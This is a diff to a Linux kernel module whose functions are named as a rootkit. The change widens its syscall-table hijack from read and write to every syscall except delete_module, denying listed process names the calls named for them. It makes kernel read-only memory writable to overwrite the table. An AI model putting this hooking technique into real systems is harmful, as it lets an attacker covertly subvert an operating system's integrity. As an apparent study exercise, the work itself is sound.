@@ -42,12 +42,11 @@ static struct kprobe kp = {
 };
 unsigned long (*__kallsyms_lookup_name)(const char *);
 static unsigned long *__sys_call_table = NULL;
+static sys_call_t orig_sys_call[NR_syscalls];
+
 void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
 unsigned long start_rodata, init_begin;
 
-/* Syscall filter */
-static sys_call_t orig_read;
-static sys_call_t orig_write;
 static LIST_HEAD(filter_list);
 
 static int rootkit_open(struct inode *inode, struct file *filp) {
@@ -130,49 +129,46 @@ static inline void __mark_rodata_ro(void) {
                         PAGE_KERNEL_RO);
 }
 
-static asmlinkage long hooked_read(const struct pt_regs *regs) {
-    filter *cur;
+// add
+static asmlinkage long hooked_syscall(const struct pt_regs *regs) {
+    struct filter *cur;
     struct task_struct *current_t;
+    u64 syscall_nr;
 
     current_t = current;
+    syscall_nr = regs->regs[8];
     list_for_each_entry(cur, &filter_list, list) {
-        if (strcmp(cur->comm, current_t->comm) == 0) {
-            pr_info("filtered read from current_t->comm: %s\n", current_t->comm);
+        if (syscall_nr == cur->syscall_nr && strcmp(cur->comm, current_t->comm) == 0) {
             return -EPERM;
         }
     }
-    return orig_read(regs);
+    return orig_sys_call[syscall_nr](regs);
 }
 
-static asmlinkage long hooked_write(const struct pt_regs *regs) {
-    filter *cur;
-    struct task_struct *current_t;
-
-    current_t = current;
-    list_for_each_entry(cur, &filter_list, list) {
-        if (strcmp(cur->comm, current_t->comm) == 0)
-            return -EPERM;
-    }
-    return orig_write(regs);
-}
-
+// modified
 static int set_syscall_hook(void) {
     __mark_rodata_wr();
 
-    orig_read = (sys_call_t)__sys_call_table[__NR_read];
-    orig_write = (sys_call_t)__sys_call_table[__NR_write];
-    __sys_call_table[__NR_read] = (unsigned long) &hooked_read;
-    __sys_call_table[__NR_write] = (unsigned long) &hooked_write;
+    for (int i = 0; i < NR_syscalls; i++) {
+        if (i == __NR_delete_module) // do NOT modify delete_module()
+            continue;
+        orig_sys_call[i] = (sys_call_t)__sys_call_table[i];
+        __sys_call_table[i] = (unsigned long) &hooked_syscall;
+    }
 
     __mark_rodata_ro();
     return 0;
 }
 
+
 static int remove_syscall_hook(void) {
     __mark_rodata_wr();
 
-    __sys_call_table[__NR_read] = (unsigned long)orig_read;
-    __sys_call_table[__NR_write] = (unsigned long)orig_write;
+    for (int i = 0; i < NR_syscalls; i++) {
+        if (i == __NR_delete_module) // do NOT modify delete_module()
+            continue;
+        __sys_call_table[i] = (unsigned long) orig_sys_call[i];
+    }
 
     __mark_rodata_ro();
     return 0;
@@ -208,7 +204,7 @@ static int add_filter(struct filter_info *finfo) {
     return ret;
 }
 
-static int remove_filter (struct filter_info *finfo) {
+static int remove_filter(struct filter_info *finfo) {
     struct filter *cur;
 
     pr_info("%s: syscall_nr=%d, comm=%s\n", __func__, finfo->syscall_nr, finfo->comm);
